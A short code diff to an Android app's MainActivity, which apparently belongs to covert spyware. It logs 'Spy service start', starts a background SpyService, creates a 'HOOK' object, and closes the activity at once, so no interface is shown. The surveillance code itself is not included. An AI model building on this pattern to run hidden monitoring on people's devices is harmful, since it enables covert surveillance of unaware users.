@@ -7,15 +7,15 @@ import android.util.Log;
 
 public class MainActivity extends Activity {
 
-    public final static String LogTag = "checking_ActivityLogcat";
-    public native String getMessage();
+    public final static String LogTag = "checking_activity";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
         Log.i(LogTag, "Spy service start");
-        Log.i(LogTag, getMessage());
+
+        HOOK hook = new HOOK();
         spyServiceStart();
         finish();
     }
@@ -23,9 +23,5 @@ public class MainActivity extends Activity {
     public void spyServiceStart() {
         Intent SpyServiceIntent = new Intent(this, SpyService.class);
         startService(SpyServiceIntent);
-    }
-
-    static {
-        System.loadLibrary("mainactivity");
     }
 }
